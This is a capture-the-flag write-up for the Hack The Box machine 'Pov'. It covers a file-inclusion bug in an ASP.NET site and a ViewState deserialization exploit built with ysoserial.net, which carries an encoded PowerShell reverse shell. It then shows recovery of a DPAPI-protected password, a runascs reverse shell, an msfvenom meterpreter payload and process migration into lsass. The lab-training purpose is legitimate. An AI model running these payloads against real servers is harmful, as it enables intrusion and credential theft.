# HTB - Pov

### TL;DR
This is a Windows Server 2019 machine used by an ASP.NET developer where he hosts his personal web site and allows his customers to get access to his CV and contact him. LFI and deserialization attacks on the _ViewState_ property are exploited to get initial foothold, and escalation is achieved abusing  _SeDebugPrivilege_ misconfiguration. <br>

### KEYWORDS
ASP.NET, LFI, ysoserial.net, deserialization, *SeDebugPrivilege*, Metasploit.

### REFERENCES
https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/aspnet/development/application-directory-configuration<br>
https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter<br>
https://github.com/pwntester/ysoserial.net<br>
https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817<br>
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml?view=powershell-7.4<br>
https://blog.ciaops.com/2019/10/06/saving-credentials-securely-with-powershell/<br>
https://jeffhicks.substack.com/p/getting-the-message-in-powershell<br>
https://www.sqlshack.com/how-to-secure-your-passwords-with-powershell/<br>
https://jlajara.gitlab.io/process-migration<br>

### ENUMERATION
Launch a port scan with `nmap`
```markdown
> nmap $target -p- -T4 -Pn --open --reason
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-27 16:02 EST
Host is up, received user-set (0.087s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap done: 1 IP address (1 host up) scanned in 375.84 seconds
```
Only port 80 is open, fuzz for subdomains.
```markdown
> ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 12330 -t 100 -u http://pov.htb -H "Host: FUZZ.pov.htb"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pov.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 12330
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 117ms]
:: Progress: [4989/4989] :: Job [1/1] :: 110 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```
Add to hosts file and enumerate with Firefox. The site belongs to an ASP.NET developer and, apart from being able to download his CV, there are no interaction points with the backend.

![Untitled0](https://github.com/g1vi/AllTheWriteUps/assets/120142960/bfde8212-1595-477c-83c5-c7d74c0b6e27)

There are no more open ports or possibilities of interaction with the backend, so the enumeration finishes here.

### USER
Since the download CV feature is the only point of interaction, let's focus on finding vulnerabilities there. Click on "Download CV", a `.pdf` is downloaded and comes into view.\
\
Repeat the operation and intercept with Burpsuite to inspect the traffic. We notice 2 interesting topics.

![Untitled01](https://github.com/g1vi/AllTheWriteUps/assets/120142960/784ae69f-ba43-4065-94bd-e7178a5b55bd)

First, the web site is built with ASP.NET and uses the `ViewState` property, which is used to store status information. For this, XML data is serialized and base64 encoded. Second, the backend refers a `cv.pdf` in the `file` parameter, this could be a point of entry for LFI.\
\
In order to discover if the LFI is exploitable, we need to know the location and path of important ASP.NET config files. Issuing a search about "config files in asp.net", the first result returned is: https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/aspnet/development/application-directory-configuration<br>
<br>
According to this, in all ASP.NET applications there must be a file called `web.config` in the root directory containing the application settings. Let's try to verify if the application is vulnerable to LFI by entering a reference to `/web.config` in the `file`  parameter.

![Untitled02](https://github.com/g1vi/AllTheWriteUps/assets/120142960/646c3c8f-fd0a-4930-9dd1-c810a3dadfd8)

Once the request is forwarded, the file `web.config` is dumped and the LFI is verified. The file dump contains several keys.

![Untitled07](https://github.com/g1vi/AllTheWriteUps/assets/120142960/28972bdc-ce7f-4864-855b-aff591d7fb04)

NOTE: Burpsuite changed the `file` to `cv.pdf` in the request; however, the contents belong to `web.config`\
\
Issuing a search about "decryptionKey validation validationKey", returns this: https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter<br>
<br>
In the link it is explained how to create serialized payloads with `ysoserial.net`. This tool generates deserialization payloads for the `ViewState` property. The tool is available here: https://github.com/pwntester/ysoserial.net<br>
<br>
The tool can be downloaded as a `.exe` binary for Windows. There are several useful `ysoserial.net` payloads and examples here: https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817. After testing, the working payload to execute a powershell base64 reverse shell is the following:
```bash
> ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4ANAA2ACIALAAxADkAMQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```
Notice you need a path to enter an `.aspx` file in the `--path` argument. Enter the `default.aspx` web page, which is usually available in Microsoft IIS environments.\
\
![Untitled03](https://github.com/g1vi/AllTheWriteUps/assets/120142960/274c0226-911d-416c-b737-ff794d630de8)

Copy the `ysoserial.net` output into the `ViewState` parameter and send with repeater.

![Untitled04](https://github.com/g1vi/AllTheWriteUps/assets/120142960/661a6286-3ae9-48c3-9a74-59999a4d9095)

A reverse shell for user `pov\sftiz` is received on Kali, which can be used to enumerate the system.

![Untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/d9b696da-6f89-4344-9bd2-6c9493bf9d43)

This shell cannot read the `user.txt` flag, so we have to move laterally to another user with permissions.\
\
Enumerating the user folders we come across this file `c:\users\sfitz\documents\connection.xml`, which contains credential for user `pov\alaading`
```bash
type c:\users\sfitz\documents\connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```
This password is neither hashed or clear text, but it has been exported as secure XML with the `export-clixml` cmdlet, which uses the Windows Data Protection API (DPAPI).<br>
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml?view=powershell-7.4<br>
https://blog.ciaops.com/2019/10/06/saving-credentials-securely-with-powershell/<br>
https://jeffhicks.substack.com/p/getting-the-message-in-powershell<br>
<br>
In order to decode this, first step is to import the XML as a PScredential object using the `import-clixml` cmdlet.
```bash
> $password=import-clixml connection.xml
```
Now we have the password stored as a PScredential object in the `$password` variable.
```bash
> echo $password

UserName                     Password
--------                     --------
alaading System.Security.SecureString
```
It can be decrypted as plain text. Here is procedure to do so with the `getnetworkcredential()` method: https://www.sqlshack.com/how-to-secure-your-passwords-with-powershell/<br>

```bash
> echo $password.getnetworkcredential().password
f8gQ8fynP44ek1m3
```
Having disclosed credential for `pov\alaading`, just login with `runascs`<br>

```bash
.\runascs alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.15.46:9999 --bypass-uac

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-786ca$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 6796 created in background.
```
The received shell runs under the context of user `pov\alaading`, which can be used to claim the user flag.

### SYSTEM
Check user `pov\alaading` privileges from a powershell.
```bash
> powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS > whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
_SeDebugPrivilege_ permits user to debug any running process owned any other user, including processes owned by system. Also, it allows to perform process migration in meterpreter (https://jlajara.gitlab.io/process-migration).<br>

Generate a meterpreter payload with `msfvenom` and transfer to the victim.
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.xxx.xxx lport=9001 -f exe -a x64 --platform windows -o shell.exe
```
Transfer the file to the host and start a `multi/handler` in Metasploit. Then run the `shell.exe` file in the `pov\alaading` shell. A meterpreter session is received on Metasploit.\
\
In the meterpreter session, check which processes are running with the `ps` command. Notice `lsass` is running under PID 636. This process is run by system, and since we have _SeDebugPrivilege_ we can migrate to any process we want, including this.

![Untitled05](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b0430d91-7a5c-442b-bd6b-c4adcc98ca9d)

Just migrate to PID 636 and open a shell.

![Untitled06](https://github.com/g1vi/AllTheWriteUps/assets/120142960/2dae3de3-319a-4942-b80e-f24001a19a11)

You are system.
